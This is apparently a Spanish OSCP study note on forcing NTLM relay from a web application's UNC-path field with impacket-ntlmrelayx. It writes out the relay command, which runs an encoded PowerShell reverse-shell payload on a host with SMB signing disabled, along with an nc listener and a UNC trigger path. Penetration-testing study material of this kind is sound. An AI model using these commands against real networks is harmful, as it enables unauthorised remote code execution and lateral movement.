---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, explotacion, ad, web]
fecha: 2026-10-09
---

# NTLM Relay Forzado desde una Aplicación Web (ntlmrelayx)

> [!abstract] Qué es y cuándo usarla
> Variante del relay NTLM clásico (ver [[Net-NTLMv2 (Responder y Relay)]]) en la que la autenticación SMB no se captura pasivamente con Responder, sino que se **fuerza activamente**: cualquier funcionalidad de una aplicación que acepte una ruta de red (UNC, `//IP/recurso`) como parte de su configuración y la "visite" al guardar (ej. un campo de "directorio de backup", un visor de ficheros remoto, un logo cargado desde una ruta UNC) es un vector para provocar que el servidor donde corre esa app se autentique por SMB contra un host propio. Si esa autenticación puede relayarse hacia un segundo host con **SMB signing deshabilitado**, se obtiene ejecución de código en él en el contexto de la cuenta que ejecuta la app (a menudo `Administrator` local).

## Requisitos previos
- Una funcionalidad web que acepte y "visite" una ruta UNC arbitraria (campo de configuración, importador de ficheros, etc.).
- Al menos un host de destino con **SMB signing deshabilitado** (comprobar con `crackmapexec smb <IP>` — el campo `signing:False` en la salida) donde la cuenta que ejecuta la app tenga el mismo password que una cuenta local/de dominio útil.

## Pasos
```bash
# 1. Levantar ntlmrelayx apuntando al host vulnerable (SMB signing deshabilitado)
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP_destino_signing_false> \
  -c "powershell -enc <base64_payload_reverse_shell>"
```
```bash
# 2. Listener para la reverse shell que ejecutará el comando relayado
nc -nvlp <puerto>
```
```text
# 3. En la app web: configurar el campo vulnerable con una ruta UNC hacia Kali (ruta inexistente, solo dispara la autenticación)
//<IP_kali>/test
```
Al guardar/aplicar esa configuración, la app intenta "acceder" a la ruta → se autentica por SMB contra Kali → `ntlmrelayx` relaya esa autenticación hacia `-t` → si las credenciales (o el hash relayado) son válidas allí y el signing está deshabilitado, ejecuta el comando `-c` → llega la reverse shell.

| Flag / parte | Qué hace |
|---|---|
| `--no-http-server` | desactiva el listener HTTP de ntlmrelayx; solo necesitamos capturar/relayar SMB |
| `-smb2support` | necesario para hosts Windows modernos (Server 2016+) |
| `-t <IP>` | host **destino** del relay — nunca el origen de la autenticación forzada |
| `-c "<comando>"` | comando ejecutado en el destino vía el servicio `RemoteRegistry` (se arranca/para automáticamente) tras el relay exitoso |

> [!warning] Detección / problemas
> - Si el host de destino (`-t`) tiene SMB signing **habilitado**, el relay fallará aunque la autenticación llegue correctamente — comprobar signing de antemano con CrackMapExec.
> - El comando relayado corre en el contexto de la cuenta que se autenticó (normalmente la cuenta de servicio de la app, o un *Administrator* local) — solo útil si esa cuenta es realmente privilegiada en el destino.
> - Confirmar primero con un comando inofensivo (ej. `whoami > C:\check.txt` vía un servicio SMB) antes de lanzar directamente una reverse shell, para verificar que el relay realmente ejecuta código.

## Visto en
- Módulo: [[27 - Assembling the Pieces]]
- Relacionado: [[Net-NTLMv2 (Responder y Relay)]] · [[Pass-the-Hash]]
- Máquinas: [[]]
</content>
